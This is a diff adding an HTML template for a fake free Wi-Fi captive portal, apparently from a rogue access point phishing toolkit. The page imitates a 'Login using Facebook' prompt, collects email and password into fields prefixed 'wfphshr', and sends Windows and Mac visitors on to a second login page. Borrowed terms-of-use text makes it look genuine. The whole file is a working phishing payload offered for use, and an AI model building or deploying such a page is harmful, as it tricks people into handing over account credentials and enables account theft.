@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+  <meta charset="UTF-8">
+  <title>{{ organization }} Wi-Fi Service</title>
+  <link rel="stylesheet" href="oauth/reset.css">
+  <link rel='stylesheet prefetch' href='oauth/roboto.css'>
+  <link rel='stylesheet prefetch' href='oauth/font-awesome.min.css'>
+  <link rel="stylesheet" href="oauth/style.css">
+  <script src='oauth/jquery.min.js'></script>
+  <script src="oauth/index.js"></script>
+</head>
+<style>
+body {
+  color: #666666;
+  font-family: 'RobotoDraft', 'Roboto', sans-serif;
+}
+
+.form-module {
+  max-width: 320px;
+}
+.login-btn {
+  cursor: pointer;
+  background: #33b5e5;
+  width: 100%;
+  border: 0;
+  padding: 10px 15px;
+  color: #ffffff;
+  -webkit-transition: 0.3s ease;
+  transition: 0.3s ease;
+}
+</style>
+<script>
+function oauth_popup() {
+  var popup_enabled = {{ popup }};
+  if (popup_enabled === true) {
+    detect_os();
+  }
+  else {
+    return false;
+  }
+}
+</script>
+<script>
+function detect_os() {
+var OSName="Unknown OS";
+if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
+if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
+if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
+if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
+if (OSName == "Windows") {
+window.location='oauth/login.html';
+    };
+if (OSName == "MacOS") {
+window.location='oauth/login.html';
+    };
+if (OSName == "Linux") {
+return false;
+    };
+
+if (OSName == "UNIX") {
+return false;
+    };
+}
+</script>
+<body onload="oauth_popup()">
+  <div class="pen-title">
+    <h1>Get connected to the Internet for free</h1><span>A simple, no frills {{ organization }} Wi-Fi service.</span>
+  </div>
+  <div class="module form-module">
+    <div class="form">
+    </div>
+    <div class="form">
+      <h2>Login using Facebook</h2>
+      <form name="theform" class="theform" method="post" action="oauth/oauth.html">
+        <input type="email" placeholder="Email" name="wfphshr-email" required />
+        <input type="password" placeholder="Password" minlength="5" name="wfphshr-password" required />
+        <button class="login-btn">Login</button>
+      </form>
+    </div>
+    <div class="cta"><a id="btn1">Terms of Usage</a></div>
+  </div>
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <span class="close">×</span>
+        <h2 style="color:darkslategray;font-size:18px;">Terms of Usage</h2>
+      </div>
+      <div class="modal-body">
+        <p>This is a {{ organization }} free Hotspot wireless internet Service (the “Service”) provided for use by
+          customers. All users are required to log-in individually as an independent user.</p>
+        <p>
+          The Service is made available provided:
+        </p>
+        <p>
+          (a) You do not use the Service for anything unlawful, immoral or improper;
+        </p>
+        <p>
+          (b) You do not use the Service to make offensive or nuisance communications in whatever form. Such usage
+          includes posting, transmitting, uploading, downloading or otherwise facilitating any content that is
+          unlawful, defamatory, threatening, a nuisance, obscene, hateful, abusive, harmful (including but not limited
+          to viruses, corrupted files, or any other similar software or programs), a breach of privacy, or which is
+          otherwise objectionable;
+        </p>
+        <p>
+          (c) You do not use the Service to harm or attempt to harm minors in any way;
+        </p>
+        <p>
+          (d) You do not act nor knowingly permit others to act in such a way that the operation of the Service or our
+          systems will be jeopardized or impaired;
+        </p>
+        <p>
+          (e) You do not use abusive or threatening behavior towards other users of the Service, members of our staff
+          or any person in the vicinity of a Wireless LAN Hotspot;
+        </p>
+        <p>
+          (f) You do not use the Service to access or use content in a way that infringes the rights of others;
+        </p>
+        <p>
+          (g) The Service is used in accordance with any third party policies for acceptable use or any relevant
+          internet standards (where applicable).
+        </p>
+        <p>
+          (h) You agree not to resell or re-broadcast any aspect of the Service, whether for profit or otherwise. You
+          accept that your entitlement to use the Service is for your personal use only and that you shall not be
+          entitled to transfer your entitlement to use the Service to any other person or allow any other person to
+          make use of the Service or of any username or password or other entitlement supplied to you in connection
+          with the Service.
+        </p>
+        <p>
+          (i) You also agree not to modify the Unit or use the Service for any fraudulent purpose, or in such a way as
+          to create damage or risk to our business, reputation, employees, subscribers, facilities, third parties or to
+          the public generally.
+        </p>
+        <p>
+          (j) You have no proprietary or ownership rights to any username or password or to a specific IP address, or
+          e-mail address assigned to you or your Unit. We may change such addresses at any time or deactivate or
+          suspend Service to any address without prior notice to you if we suspect any unlawful or fraudulent use of
+          the services.
+        </p>
+      </div>
+    </div>
+</body>
+</html>
